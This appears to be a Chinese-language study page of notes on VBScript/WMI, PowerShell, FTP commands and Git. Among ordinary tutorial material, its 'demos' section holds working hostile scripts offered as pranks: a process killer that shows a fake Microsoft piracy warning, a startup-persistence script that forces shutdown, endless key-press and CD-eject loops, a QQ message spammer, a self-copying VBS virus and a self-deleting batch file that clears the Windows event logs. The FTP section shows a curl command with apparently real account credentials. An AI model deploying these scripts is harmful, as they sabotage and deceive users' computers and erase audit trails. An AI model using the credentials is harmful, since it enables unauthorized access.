 WScript.Echo "Name:  " & wbemObject.Name & vbCrLf & _
   " Handle: " & wbemObject.Handle & vbCrLf & _
   " Process ID: " & wbemObject.ProcessID
Next

7.在运行脚本之后可以用WIMI测试器验证脚本的结果。在Win32_Process对话框的对象编辑器中,单击Instances。产生的查询结果对话框列出在计算机上运行的进程的实例。双击一个指定的进程实例,查看该实例的详细信息。

</pre>其实用vbs和wmi结合起来阻止别人运行你不想运行的程序,windows任务管理器结束Wscript.exe和wmiprvse.exe进程的运行即可解除<textarea>On Error Resume Next '忽略所有的错误
Dim bag,pipe,honker,good
Do
good="." '定义为本地计算机
set bag=getobject("winmgmts:\\"& good &"\root\cimv2") 'l连接到cimv2命名空间
set pipe=bag.execquery("select * from win32_process where name='qq.exe' or name='qqgame.exe' or name='winmine.exe'") '这是我的计算机上不允许运行的程序
for each i in pipe
i.terminate()
msgbox "发现盗版系统,现已进行功能限制！" & vbcrlf & "请使用正版软件！",,"微软提示" '此行其实可有可无,有这行只是为了免去怀疑
next
wscript.sleep 60000 '每1分钟检测一次
loop

</textarea><pre>
【 使用dictionary对象 】
VBS中存在一个特殊的对象dictionnary,是一个集合对象。一般把这个特殊的集合想象为数组,可以使用其中内建的函数完成存储和操纵数据等基本任务,无须担心数据是在哪些行列,而是使用唯一的键进行访问或是一个只能运行在内存中的数据库,并只有两个字段分别是:key和item,在使用中字段key是索引字段。

'定义了一个 dictionary 对象的实例sdict,并加入了三条数据,然后对每一条数据进行了枚举,最后,将对象的实例清空'
set sdict=CreateObject("Scripting.Dictionary")
sdict.add "a","apple"
sdict.add "b","banana"
sdict.add "c","copy"
for each key in sdict.keys
msgbox "键名" & key & "是" & " = " & sdict (key)
next
sdict.removeall

Dictionary对象的成员概要

属性
CompareMode    设定或返回键的字符串比较模式
Count     只读。返回 Dictionary 里的键/条目对的数量
Item(key)  设定或返回指定的键的条目值
Key(key)  设定键值

方法
Add(key,item)  增加键/条目对到 Dictionary
Exists(key)  如果指定的键存在,返回 True,否则返回 False
Items()  返回一个包含 Dictionary 对象中所有条目的数组
Keys()  返回一个包含 Dictionary 对象中所有键的数组
Remove(key)  删除一个指定的键/条目对
RemoveAll()   删除全部键/条目对

</pre>

<h4>demos</h4>
无限弹出光驱<textarea>set wmp=createobject("wmplayer.ocx")
set cd=wmp.cdromcollection.item(0)
do
cd.eject
loop

</textarea>无尽语音报数:无限语音从1数到无限大<textarea>Set s = CreateObject("sapi.spvoice")
i=0
do
s.speak i
i=i+1
loop

</textarea>无尽刷新:慎用,如此刷新打开任务管理器都难,只能拔掉电源<textarea>set ws=createobject("wscript.shell")
do
ws.sendkeys "{f5}"
loop

</textarea>修改注册表<textarea>on error resume next
set wr=createobject("scripting.filesystemobject")
set ws=createobject("wscript.shell")
set f = wr.getfile(wscript.scriptfullname)
q=ws.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup")
if not f="Win32.vbs" then wr.copyfile f,q&"\Win32.vbs",true
ws.run"shutdown -p",vbhide

</textarea>直接关机<textarea>dim WSHshell
set WSHshell = wscript.createobject("wscript.shell")
WSHshell.run "shutdown -f -s -t 00",0 ,true

</textarea>不断按下alt+f4:打开任何程序都关掉<textarea>dim WSHshell
set WSHshell = wscript.createobject("wscript.shell")
do
wscript.sleep 2500
WSHshell.SendKeys "%{F4}"
loop

</textarea>QQ信息骚扰恶搞<textarea>打开好友的聊天对话框,然后记下聊天对话框的名称(如图:小敏),把下面代码里的小敏替换一下。代码中的“10”代表发送次数,把10修改一下就可以自定义发送QQ信息到好友的次数。把发送的内容“复制”即可,当打开本vbs的时候就会把剪切板里的内容粘贴发送过去。

On Error Resume Next
Dim wsh,ye
set wsh=createobject("wscript.shell")
for i=1 to 10
wscript.sleep 700
wsh.AppActivate("小敏")
wsh.sendKeys "^v"
wsh.sendKeys i
wsh.sendKeys "%s"
next
wscript.quit

</textarea>vbs病毒的简单例子源代码解析<textarea>'寻找硬盘上所有满足条件的文件,对其进行强制性覆盖、并再创建一个相同文件名但后带.vbs的文件

dim folder,fso,foldername,f,d,dc
set fso=createobject("scripting.filesystemobject")
set self=fso.opentextfile(wscript.scriptfullname,1)
vbscopy=self.readall '读取病毒体,以备复制到文件
self.close
set dc=fso.Drives
for each d in dc
if d.drivetype=3 or d.drivetype=2 then '检查磁盘类型
wscript.echo d '弹出窗口,显示找到盘符
scan(d)
end if
next
lsfile=wscript.scriptfullname '该脚本程序路径
set lsfile=fso.getfile(lsfile)
lsfile.delete(true) '病毒运行后自我删除(本人自加,爱虫病毒本身没有该代码)
sub scan(folder_)
on error resume next
set folder_=fso.getfolder(folder_)
set files=folder_.files
for each file in files
ext=fso.GetExtensionName(file) '获取文件后缀
ext=lcase(ext) '后缀名转换成小写字母
if ext="mp5" then '如果后缀名是mp5,当然不存在这种文件,这里可以自己修改,但是注意。请自己建立相应后缀名的文件,最好是非正常后缀名
set ap=fso.opentextfile(file.path,2,true)
' ap.write vbscopy '覆盖文件,慎用
ap.close
set cop=fso.getfile(file.path)
cop.copy(file.path & ".vbs") '创建另外一个病毒文件
' file.delete(true) '删除原来文件
end if
next
set subfolders=folder_.subfolders
for each subfolder in subfolders '搜索其他目录
scan(subfolder)
next
end sub

</textarea>清除日志.bat<textarea>@echo off
choice /t 60 /d y /n >nul      '延迟60秒执行
echo on error resume next>clear.vbs
echo set wmi_clear=getobject("winmgmts:\\.\root\cimv2")>>clear.vbs
echo dim lianan_names(2)>>clear.vbs
echo lianan_names(0)="application">>clear.vbs
echo lianan_names(1)="security">>clear.vbs
echo lianan_names(2)="system">>clear.vbs
echo for each lianan_name in lianan_names>>clear.vbs
echo set lianan_logs=wmi_clear.execquery("select * from win32_nteventlogfile where logfilename='"^&lianan_name^&"'")>>clear.vbs
echo for each lianan_log in lianan_logs>>clear.vbs
echo lianan_log.cleareventlog()>>clear.vbs
echo next>>clear.vbs
echo next>>clear.vbs
clear.vbs
del /f /q clear.vbs
del %0     '删除本身
exit

</textarea>
</div>

<div id="powershell">
<h3>powershell命令行</h3><pre>
PowerShell强大的地方在于面向对象及可使用DotNet类库,命令都可以按对象来执行,比如把字符串进行大小写转换,"AbCdEfG"转换位全部大写,命令为:"AbCdEfG".ToUpper()
命令提示符(Command Prompt) -> PowerShell   // cmd和powershell相互切换
win+R -> powershell

用PowerShell来监测进程是否存在,存在即退出
(get-pocess -name notepad).kill()或get-process -name notepad | stop-process

PowerShell通过操作Excel组件,比如:$xls=new-object -comobject "Excel.Application",就可以创建一个Excel进程,然后可以通过相应的命令去操作这个Excel

ls  同dir
wmic os get osarchitecture  获取Windows版本  // OSArchitecture   64 位

get-help curl
get-help curl -online  获取命令的网页帮助

【 cmdlet命令 】
所有的cmdlet命令规则都遵循动词-名词这种语法结构,如Get-Command、Get-Content等
使用Tab键来自动完成命令输入,包括命令的名称和参数的名称

Get-Command命令获取所有命令集合
Get-Command -name *process 命令获取包含Process的所有命令集合
get-help get-command           获取get-command命令的帮助信息
get-help get-command -full
get-help get-command -examples
get-help get-command -detailed
get-help Get-Command -Parameter name  // 查询Get-Command参数name的信息
get-help get-process
get-help ps                           // 使用别名
get-help get-process -parameter id    // 查询get_process参数id的信息

help Get-Command    // enter翻页

Get-Command -?

PowerShell一些内置命令都有别名,方便记忆和输入,可以用Get-Help命令查看别名,如下Get-Children的命令有三个别名:gci、ls和dir,输入任意一个都可以列举当前目录

由于PowerShell可以使用.NET Framework中的对象,因此要想查看一个对象的属性和方法可以使用Get-Member命令
Get-Command | Get-Member   获取get-command命令的属性和方法

显示对象属性为列表或表格
使用Format-List和Format-Table命令
ps> ls | format-list    // 详细列表
ps> ls | format-table   // 默认

重定向输出
如果想把得到的结果输出到文件中,可以使用Out-File命令或者重定向操作符将命令输出的结果保存在文件中
ps> ls | out-file test.txt
ps> get-content .\test.txt

记录PowerShell会话全文
如果想生成当前会话的记录,可以运行Start-Transcript命令,基于当前系统时间。如果想停止运行Stop-Transcript
ps> start-transcript -path transcript.txt
ps> get-command -name *process
ps> stop-transcript
ps> get-content .\transcript.txt

使用管理控制台历史命令上下方向键或者Get-History,命令查找,用Invoke-History Id方式进行调用
ps> Get-History

  Id CommandLine
-- -----------
   1 cls
   2 get-command
   3 Get-Command -name *process
   4 Get-Help Get-Command -full -Detailed -Examples
   5 Get-Help Get-Command -Examples
   6 Get-Help Get-Command -full
   7 cls
   8 Get-Command Get-Member
   9 Get-Command | Get-Member
  10 cls
  11 Measure-Command {ping localhost}
  12 $LASTEXITCODE

ps> > Invoke-History 12
$LASTEXITCODE
0

【 powershell管道(pipeline) 】
管道即在一组命令中输出的命令结果成为下一个命令的输入参数,使用管道符号(|)来划分管道中的每个命令
Get-ChildItem | Where-Object {$_.Length -gt 200} | Sort-Object -Descending Name
获取当前路径的所有项目
查看上一步结果,取所有长度大于200的项目
查看上一步结果,按照Name进行倒叙排列

Where-Object(别名where和?)从列表或者命令输出结果中过滤选择你需要的项目
对于输入的每一项,Where-Object都会根据{}中定义的脚本块对输入进行计算,如果返回True,则输出,否则不输出
{}表示一个脚本块,可以输入一系列PowerShell命令,其中$_代表当前输入对象,-gt是比较操作符

操作符的意义及返回True的例子
-eq 相等符 10 -eq 10
-ne 不相等符  10 -ne 9
-ge 大于等于操作符 10 -ge 9
-gt 大于操作符 10 -gt 9
-lt 小于操作符 10 -lt 11
-le 小于等于操作符 10 -le 11
-like 相似操作符 "Bob" -like "*ob"
-notlike  非相似操作符  "Bob" -notlike "1*ob"
-match  匹配操作符 "Bob" -match "B*ob"
-notmatch 非匹配操作符  "Bob" -notmatch "123*"
-contains 包含操作符 "Bob","Bob1" -contains "Bob"
-notcontains  非包含操作符  "Bob","Bob1" -notcontains "ob"
-is 类型操作符 "Bob" -is "System.String"
-isnot  非类型操作符  "Bob" -isnot "System.Int32"

get-childitem | where-object {$_.name -like 'test.*'}

ForEach-Object命令(别名foreach和%)来处理列表中的每一项
ps> 1..10 | ForEach-Object {$_ * 5}
ps> 1..10 | foreach {$_ * 5}
ps> 1..10 | % {$_ * 5}

Select-Object(别名select)对象可以选择一个对象或者一组对象的指定属性。还可以从对象的数组中选择唯一的对象,也可以从对象数组的开头或末尾选择指定个数的对象

如果使用Select-Object来选择指定属性,则它会从输入对象中复制这些属性的值,并创建具有指定的属性和复制的值的新对象。使用Property参数指定要选择的属性,或使用First、Last、Unique、Skip和Index参数从输入对象数组中选择特定对象
dir | select name,length    输出name,length属性
dir | select -first 3       输出前3个属性
dir | select -index 0,5     输出当前路径下第一个和第六个项目
dir | select -skip 4        输出当前路径下第五个项目外的所有项目
1,1,3,4,2,3,4|select -unique输出数组中的唯一数字

选择当前路径下所有项目的Name和自定义属性,名字叫做Last Modified Day,结果是通过LastWriteTime属性算出来的
dir | select -property name,@{name='last modified day';expression={$_.lastwritetime.dayofweek}}

Sort-Object(别名sort)可以按照特定属性值对对象进行排序。可指定一个属性或多个属性(用于多键排序),也可以选择区分大小写或不区分大小写的排序。还可以指示Sort-Object只显示对于特定属性具有唯一值的对象
如果某个对象不具有所指定的属性之一,则cmdlet会将该对象的属性值解释为NULL,并将其放置在排序顺序的末尾
dir | sort -property length             按照项目长度从小到大排序
1,1,3,4,2,3,4|sort -descending -unique  对数组中唯一性的数字降序排序

Tee-Object(别名tee)命令可以将命令输出结果保存在文件或者变量中,同时将其显示在控制台中
将当前路径下所有大小大于900的项目都保存到文件中并显示在控制台中
dir | where {$_.length -gt 900} | tee -filepath teeresult.txt
将当前路径下所有大小大于900的项目都保存到变量中并显示在控制台中
dir | where {$_.length -gt 900} | tee -variable $test
$test

Group-Object(group)对列表项或输出结果进行分组,指定的属性包含相同值的组对象。Group-Object返回一个表,其中每个属性值对应一行,同时一个列显示具有该值的项目数
dir | group -property length
可以让返回的对象是个HashTable——key-value的键值对数组,指定-AsHashTable参数
dir | group -property length -ashashtable -asstring

Measure-Object:对列表项或输出结果进行计算
使用Measure-Object(measure)计算对象的数字属性以及字符串对象(如文本文件)中的字符数、单词数和行数。它计算某些类型对象的属性值。Measure-Object执行三种类型测量,具体取决于命令中的参数。可以对对象计数并计算数字值的最小值、最大值、总和及平均值。对文本对象可以计数并计算行数、单词数和字符数
dir | measure        计算当前路径下项目的总数
dir | measure -property length -Minimum -Maximum -Average 计算当前路径下项目的长度的最小值、最大值及平均值
计算当前文件中字符、行、单词的总数
Get-Content .\array.php | measure -Character -line -word

Compare-Object(别名compare和diff)可以将两组对象进行比较,一组对象为Reference组,而另一组为Difference组。比较的结果将指示属性值是只出现在Reference组中的对象中(由 <= 符号指示),或是只出现在Difference组中的对象中(由 => 符号指示),或(在指定了IncludeEqual参数的情况下)同时出现在这两个对象中(由 == 符号指示)
$result = Get-Content .\array.php
Get-Content  .\date.php | compare $result | f1

ConvertTo-Html可以将Microsoft.Net Framework对象转换为可在Web浏览器中显示的HTML
get-date | ConvertTo-Html

Export-Csv(别名epcsv)将Microsoft .NET Framework 对象转换为一系列以逗号分隔的、长度可变的(CSV) 字符串,并将这些字符串保存到一个CSV文件中
dir | select name,length | export-csv -path test.txt

Format-List(别名fl)可以将输出的格式设置为属性列表,其中每个属性均各占一行显示
dir | select -index 0 | format-list
Format-Table(别名ft)可以将输出的格式设置为表
dir | select -index 0 | format-table
Format-Wide(别名fw)可以将对象的格式设置为只能显示每个对象的一个属性的宽表
dir | select -skip 6 | format-wide -column 3

Get-Unique(别名gu)可以从排序列表中返回唯一项目
1,22,323,432,23,23,22,43 | sort -descending | get-unique

Out-File将输出发送到文件
dir | out-file outfile.txt
get-content .\outfile.txt

Get-Member:如何获取管道操作对象的属性
管道操作的时候经常会用到管道输入对象的属性,使用Get-Member(gm)来获取对象的属性和方法
$var | gm -membertype property       获取对象的公有属性
$var | gm -membertype method         获取对象的公有方法

判断一个命令是否支持管道输入
使用Get-Help命令获取一个命令的使用方法,对于参数,可以看到是否支持管道输入,或者通过MSDN去查询命令帮助

自动化处理数据密集型任务
如果要对大量的数据进行处理简单的任务,可以把数据保存在一个CSV文件里面,使用Impor-Csv来导入数据,导入后为每一行自动创建对象,并将列的名字作为对象的属性,之后用foreach对数据的每一项进行操作
dir | select name,length | export-csv -path test.csv
import-csv test.csv | foreach {Get-WmiObject $_.name -ComputerName $_.length}

【 powershell运行程序、脚本和已有软件:可执行文件、Perl脚本、批处理文件 】
.cmd文件
.ps1文件
PowerShell的脚本文件包括:*.ps1(脚本文件),*.psm1(脚本模块文件),*.psd1(脚本数据文件),*.ps1xml(脚本配置文件)

有时候PowerShell会阻止运行ps1脚本文件,我们需要修改执行策略,策略有四种,不同策略对应不同的执行权限
restricted:默认,不运行脚本
allsigned:所有脚本需要可信发布者签名
remotesigned:网上下载的脚本需要可信发布者签名,建议选用这个
unrestricted:安全性最低,允许所有脚本运行
以管理员模式运行PowerShell,并执行命令:set-executionpolicy remotesigned

把ps1脚本文件编译为Exe可执行文件,ps1 to exe online converter,通过这个中间脚本可以将ps1脚本文件编译为Exe可执行文件

用PowerShell来翻译txt文件,调用翻译网站的API,需要先申请翻译网站的开发API

玩游戏可以用PowerShell自己编写自己玩

在外部调用PowerShell脚本
有时候可能需要从批处理文件、定时任务或者其它非PowerShell程序调用PowerShell脚本,语法:PowerShell "& 'full path of the script'arguments"。如下例子是从CMD调用PowerShell
cmd> powershell "& 'C:\test.cmd'"

PowerShell提供了两个变量可以检测最后执行的命令是否成功:$lastExitCode和$?
$lastExitCode:数字型变量,返回最后脚本或应用程序执行返回的退出码或出错级别
$?:布尔型变量,返回最后执行命令的成功还是失败
变量$?使用更通用的方式来描述最后的应用程序退出的状态,在以下应用程序发生错误的时候,PowerShell会设置$?为False:
应用程序退出码非零;
cmdlet或脚本输出错误信息;
cmdlet或脚本捕获到终止错误或异常
当命令执行没有错误的时候,PowerShell设置$?变量为True

计算一个命令执行时间,可以使用Measure-Command命令
ps> > Measure-Command {ping localhost}

Days              : 0
Hours             : 0
Minutes           : 0
Seconds           : 3
Milliseconds      : 293
Ticks             : 32939546
TotalDays         : 3.8124474537037E-05
TotalHours        : 0.000914987388888889
TotalMinutes      : 0.0548992433333333
TotalSeconds      : 3.2939546
TotalMilliseconds : 3293.9546

在目标文件的目录下直接输入文件名
如果文件名字或路径中有空格,需要用'引号将命令扩起来,同时在前面加上符号&,这种叫做调用操作
要运行当前目录下的命令,需要文件名前加.,如.\test.bat
要运行当前目录下的命令,而且命令名字或路径带有空格,需要同时加上符号&和',如& '.\test folder\test.cmd'

【 PowerShell脚本编辑器PS ISE 】
powershell GUI编程

Add-Type -AssemblyName System.Windows.Forms  #添加WindowsForm类型到当前代码
$Form1 = New-Object System.Windows.Forms.Form  #创建一个Form
$form1.Text = "我是王大锤"  #增加标题
$Label1 = New-Object System.Windows.Forms.Label  #创建标题框
$label1.AutoSize = $true  #设置标题框自动适应文字大小
$label1.Text = "兄台,您尊姓大名?"  #设置标题框文字
$Form1.Controls.Add($Label1)  #为Form添加Label
$TextBox1 = New-Object System.Windows.Forms.TextBox  #创建文本框
$TextBox1.Text = "我叫..."  #设置文本框文字
$TextBox1.Location = New-Object System.Drawing.Point(0,30)  #设置位置
$Form1.Controls.Add($TextBox1)  #为Form添加TextBox
$TextBox1.Add_KeyDown({$Form1.Text = $TextBox1.Text})  #创建事件处理代码
$Form1.ShowDialog()  #显示

</pre>
</div>

<div id="ftp">
<h2>FTP</h2><pre>
FTP是File Transfer Protocol(文件传输协议)的简称,用于Internet上的控制文件的双向传输,同时也是一个应用程序(Application)。基于不同的操作系统有不同的FTP应用程序,而所有这些应用程序都遵守同一种协议以传输文件。

互联网上提供文件存储和访问服务的计算机,他们依照的是FTP协议提供服务,支持FTP协议的服务器就是FTP服务器,FTP协议提供存储和传输服务的一套协议。

windows iis可以搭建FTP,网络上开放的ftp的主机很多,其中很大一部分是匿名的,也就是说任何人都可以登陆上去。如果扫到了一台开放ftp服务的主机就可以使用ftp的命令,一般都是开了21端口的机器

下载Download和上传Upload
下载文件就是从远程主机拷贝文件至自己的计算机上;上传文件就是将文件从自己的计算机中拷贝至远程主机上。用Internet语言来说,用户可通过客户机程序向(从)远程主机上传(下载)文件

【 工作原理 】
FTP采用客户端/服务端的工作模式(C/S结构),通过TCP协议建立客户端和服务器之间的连接,但与其他大多数应用协议不同,FTP协议在客户端和服务端之间建立了两条通信链路(即2个通道),分别是控制链路和数据链路,其中控制链路负责FTP会话过程中FTP命令的发送和接收,数据链路则负责数据的传输

FTP的工作有2种方式,一种是主动模式,一种是被动模式,以FTPServer为参照物,主动模式是服务器主动连接客户端传输,被动模式是等待客户端的连接,无论是主动模式还是被动模式,首先的控制通道都是先建立起来的,只是在数据传输模式上的区别

【 访问FTP服务器的方式 】
1、浏览器 ftp://60.205.36.34 会提示输入用户名密码
2、文件管理器 ftp://60.205.36.34 会提示输入用户名密码,以文件形式显示,上传和下载只需要进行复制粘贴
3、客户端FTP软件:FlashFXP、FileZilla、8UFTP
4、cmd
5、powershell curl命令
6、PHP curl函数

ftp://用户名:密码@服务器ip或域名:端口号/文件夹/文件
ftp://test:test@192.168.0.1:21/profile

【 cmd命令访问FTP 】
cmd> ftp
进入ftp命令,将文件传送到运行FTP服务器服务(后台程序)的计算机以及将文件从该计算机传出,交互使用Ftp

500 I won't open a connection to 192.168.43.27(only to 117.136.88.134)
resolve:passive命令切换FTP的主被动模式

ftp error: 425 Failed to establish connection.
resolve: 关闭windows防火墙

ftp使用的内部命令
ftp> open host [port]   登录ftp服务器
FTP服务器地址,如果FTP服务器不是用的21默认端口则应在后面空格加端口号
输入密码时密码不回显,打完密码后回车即可,如果密码输入错误,将不会提示重新输入,这时要键入"user"命令可以重新输入用户名和密码

ftp> user user-name[password][account]
向远程主机表明身份,需要口令时必须输入口令,如user admin@email
匿名登陆时用户显示为Anonymous

ftp> ? get                         查看get命令的帮助文件
ftp> help get                      获取get命令的帮助文件
ftp> dir                           显示远程主机目录
ftp> dir[remote-dir][localFile]    显示远程主机目录,并将结果存入本地文件localFile
ftp> mdir remoteFiles localFile    与dir类似,但可指定多个远程文件,如:mdir *.o.*.zipoutfile
ftp> ls                            显示远程主机目录
ftp> ls [remote-dir] [localFile]   显示远程目录remote-dir, 并存入本地文件localFile
ftp> cd remote-dir                 进入远程主机目录
ftp> lcd[dir]                      将本地工作目录切换至dir
ftp> pwd                           显示远程主机的当前工作目录
ftp> lcd                           切换下载目录(默认是C:\User\yourAccount\)
ftp> prompt 设置多个文件传输时的交互提示,输入mget命令回车即可下载,看到"Transfer complete"表示下载成功
ftp> get                           下载单个文件到本地当前目录下,get README.md
ftp> get remoteFile [localFile]    将远程主机的文件remoteFile传至本地硬盘的localFile
ftp> mget remoteFiles              获取多个远程文件
ftp> put localFile [remoteFile]    将本地文件localFile传送至远程主机,要看远程ftp服务器是否给了可写的权限
ftp> mput localFile                将多个文件传输至远程主机
ftp> recv remoteFile[localFile]    同get
ftp> send localFile[remoteFile]    同put
ftp> mkdir dir-name                在远程主机中建一目录
ftp> delete remoteFile             删除远程主机文件,必须保证有可写的权限
ftp> mdelete[remoteFile]           删除远程主机多个文件
ftp> rename[from][to]              更改远程主机文件名
ftp> rmdir dir-name                删除远程主机目录
ftp> hash                          为每个缓冲区传输切换打印"#,每传输1024字节,显示一个hash符号(#)
ftp> mls remoteFile localFile      同nlist,但可指定多个文件名
ftp> mode[modename]                将文件传输方式设置为modename, 缺省为stream方式
ftp> modtime file-name             显示远程主机文件的最后修改时间
ftp> append localFile [remoteFile] 将本地文件追加到远程系统主机,若未指定远程系统文件名则用本地文件名
ftp> glob                  切换本地文件名的元字符扩展,设置mdelete/mget/mput的文件名扩展,缺省时不扩展文件名,同命令行的-g参数
ftp> ![cmd[args]]          转义到shell,在本地机中执行交互shell,exit回到ftp环境,如:!ls*.zip
ftp> bell                  铃声模式,每个命令执行完毕后计算机响铃一次
ftp> debug[debug-value]    设置调试方式,显示发送至远程主机的每条命令,如deb up 3,若设为0表示取消debug
ftp> trace                 设置包跟踪
ftp> verbose               详细报告模式,同命令行的-v参数,ftp服务器的所有响应都将显示给用户,缺省为on
ftp> ascii                 设置ASCII传输类型,使用ascii类型传输方式
ftp> bin                   设置二进制传输类型,使用二进制文件传输方式
ftp> type[type-name]       设置文件传输类型为type-name,缺省为ascii,如type binary,设置二进制传输方式
ftp> quit                  同bye,退出ftp会话
ftp> bye                   退出ftp会话过程
ftp> close                 中断与远程服务器的ftp会话(与open对应)
ftp> disconnection         同close
ftp> status                显示当前ftp状态
ftp> literal               发送任意ftp命令
ftp> quote arg1,arg2...    发送任意ftp命令,将参数逐字发至远程ftp服务器,如:quote syst.

【 curl ftp 】
访问ftp地址
curl -u username:password ftp://www.xxx.com
curl -u ftp://www.xxx.com
curl ftp://bxu2359690171:aliyun6958@bxu2359690171.my3w.com

添加端口
curl -u username:password -P8899 ftp://www.xxx.com

1、列出ftp服务器上的目录列表:
curl ftp://www.xxx.com/ --user name:passwd
curl ftp://www.xxx.com/ –u name:passwd # 简洁写法
curl ftp://name:passwd@www.xxx.com # 简洁写法2

2、只列出目录,不显示进度条
curl ftp://www.xxx.com –u name:passwd -s

3、下载一个文件:
curl –u name:passwd ftp://www.xxx.com/size.zip -o size.zip
curl -u ftpuser:ftppass -O ftp://ftp_server/public_html/xss.php

4、上传文件到ftp:
curl -u username:password -T /home/neo/demo.jpg ftp://www.xxx.com/mp3/
curl -u ftpuser:ftppass -T "{file1,file2}" ftp://ftp.testserver.com  # 同时上传多个文件
curl -u ftpuser:ftppass -T - ftp://ftp.testserver.com/myfile_1.txt # 从标准输入获取内容保存到服务器指定的文件中

5、从服务器上删除文件(使用curl传递ftp协议的DELE命令):
curl –u name:passwd ftp://www.xxx.com/ -X 'DELE mp3/size.mp3'

6、另外curl不支持递归下载,不过可以用数组方式下载文件,比如下载1-10.gif连续命名的文件:
curl –u name:passwd ftp://www.xxx.com/img/[1-10].gif –O  # O字母大写
curl –u name:passwd ftp://www.xxx.com/img/[one,two,three].jpg –O  # O字母大写
curl -u ftpuser:ftppass -O ftp://ftp_server/public_html/  # 下载public_html下的所有文件夹和文件

</pre>
</div>


<div id="git">
<h2>GIT</h2><pre>
Git是目前世界上最先进的分布式版本控制系统
CVS及SVN都是集中式的版本控制系统,而Git是分布式版本控制系统
集中式版本控制系统,版本库是集中存放在中央服务器的,最大的毛病就是必须联网才能工作
分布式版本控制系统根本没有中央服务器,每个人的电脑上都是一个完整的版本库,这样工作时就不需要联网了,因为版本库就你自己的电脑上。既然每个人电脑上都有一个完整的版本库,那多个人如何协作呢？比方说你在自己电脑上改了文件A,同事也在他的电脑上改了文件A,这时你们之间只需把各自的修改推送给对方就可以互相看到对方的修改了。

和集中式版本控制系统相比,分布式版本控制系统的安全性要高很多,因为每个人电脑里都有完整的版本库,某一个人的电脑坏掉了不要紧,随便从其他人那里复制一个就可以了。而集中式版本控制系统的中央服务器要是出了问题,所有人都没法干活了。

在实际使用分布式版本控制系统的时候,其实很少在两人之间的电脑上推送版本库的修改,因为可能不在一个局域网内,两台电脑互相访问不了,也可能今天你的同事病了,他的电脑压根没有开机。因此分布式版本控制系统通常也有一台充当"中央服务器"的电脑,但这个服务器的作用仅仅是用来方便"交换"大家的修改,没有它大家也一样干活,只是交换修改不方便而已

版本库又名仓库repository,可以简单理解成一个目录,里面的所有文件都可以被Git管理起来,Git能跟踪每个文件的修改、删除,以便任何时刻都可以追踪历史或将来可以还原

所有的版本控制系统其实只能跟踪文本文件的改动,比如TXT文件、网页、所有的程序代码等,版本控制系统可以记录每次的改动,如在第5行加了一个单词"Linux",在第8行删了一个单词"Windows",而图片、视频、Microsoft的Word格式这些二进制文件,虽然也能由版本控制系统管理,但没法跟踪文件的变化,只能把二进制文件每次改动串起来,也就是只知道图片从100KB改成了120KB,但到底改了什么版本控制系统不知道,也没法知道。

如果要真正使用版本控制系统就要以纯文本方式编写文件,因为文本是有编码的,比如中文有常用的GBK编码,强烈建议使用标准的UTF-8编码,所有语言使用同一种编码,既没有冲突,又被所有平台所支持

GIT官网下载安装程序安装
git CMD
git Bash  git命令行操作界面
git GUI   git的图形化界面

工作区(Working Directory):在电脑里能看到的目录
版本库(Repository):工作区有一个隐藏目录.git是Git的版本库,这个不算工作区,Git版本库里存了很多东西,其中最重要的就是称为stage或index的暂存区,还有Git自动创建的第一个分支master及指向master的一个指针叫HEAD

git库所在的文件夹中的文件大致有4种状态
1、Untracked:
未跟踪,此文件在文件夹中,但并没有加入到git库,不参与版本控制,通过git add状态变为Staged

2、Unmodify:
文件已经入库,未修改,即版本库中的文件快照内容与文件夹中完全一致,这种类型的文件有两种去处,如果它被修改而变为Modified,如果使用git rm移出版本库则成为Untracked文件

3、Modified:
文件已修改,仅仅是修改,并没有进行其他的操作,这个文件也有两个去处,通过git add可进入暂存staged状态,使用git checkout从库中取出文件覆盖当前修改,即丢弃修改的内容返回到unmodify状态

4、Staged:
暂存状态,如果执行git commit则将修改同步到库中,这时库中的文件和本地文件又变为一致,此时文件为Unmodify状态,如果执行git reset HEAD filename取消暂存,文件状态为Modified

Git状态untracked和not staged的区别
untrack表示是新文件,没有被add过,是为跟踪的意思。
not staged表示add过的文件,即跟踪文件,再次修改没有add,就是没有暂存的意思

</pre>

<h4>.gitignore文件</h4><pre>
某些文件必须放到Git工作目录中但又不能提交它们,不需要添加到版本管理中,比如保存数据库密码的配置文件等,每次git status都会显示Untracked files,可以在Git工作区的根目录下创建一个特殊的.gitignore文件,将要排除的文件或目录写到其中,Git会根据这些规则来判断是否将文件添加到版本控制中,Git就会自动忽略这些文件

GitHubtig各种配置文件模板https://github.com/github/gitignore,只需要组合一下就可以使用了。

有时想添加一个文件到Git,但发现添加不了,原因是这个文件被.gitignore忽略了,如果确实想添加该文件,可以用-f强制添加到Git:
$ git add -f App.class

.gitignore只能忽略那些原来没有被track的文件,如果某些文件已经被纳入了版本管理中则修改.gitignore是无效的。
如果意外的将想要忽略的文件添加到缓存中去了可以使用rm命令将其从中移除,以后可以直接使用"git add -A"来添加修改的内容,上传的文件就会受到.gitignore文件的内容约束
$ git rm HelloWorld.class --cached
$ git rm -r dirToDelete --cached
$ git rm -r --cached directory
$ git rm -r --cached .

如果不慎在创建.gitignore文件之前就push了项目,那么即使在.gitignore文件中写入新的过滤规则,这些规则也不会起作用,Git仍然会对所有文件进行版本管理。简单来说出现这种问题的原因就是Git已经开始管理这些文件了,所以无法再通过过滤规则过滤它们。所以大家一定要养成在项目开始就创建.gitignore文件的习惯,否则一旦push处理起来会非常麻烦

如果已经把不想上传的文件上传到了git仓库,那么必须先从远程仓库删了它,可以从远程仓库直接删除然后pull代码到本地仓库,这些文件就会被删除,或者从本地删除这些文件并且在.gitignore文件中添加这些想忽略的文件,然后再push到远程仓库

【 .gitignor忽略规则验证 】
如果发现.gitignore写得有问题,需要找出来到底哪个规则写错了,可以用git check-ignore命令检查:
$ git check-ignore -v HelloWorld.class
.gitignore:1:*.class    HelloWorld.class
可以看到HelloWorld.class匹配到了第一条*.class的忽略规则,所以文件被忽略了,如果没有匹配则没有输出

【 有三种方法可以实现忽略Git中不想提交的文件 】
1)在Git项目中定义.gitignore文件
这种方式通过在项目的某个文件夹下定义.gitignore文件来管理当前文件夹下的文件的Git提交行为。.gitignore文件是可以提交到公有仓库中,这就为该项目下的所有开发者都共享一套定义好的忽略规则

2)在Git项目的设置中指定排除文件
这种方式只是临时指定该项目的行为,需要编辑当前项目下的.git/info/exclude文件,然后将需要忽略提交的文件写入其中,这种方式指定的忽略文件的根目录是项目根目录。
这种方法就不提倡了,只能针对单一工程配置,而且还不能将过滤规则同步到其他开发者,跟其他方法比较起来没有一点优势。

3)定义Git全局的.gitignore文件来管理所有Git项目的行为
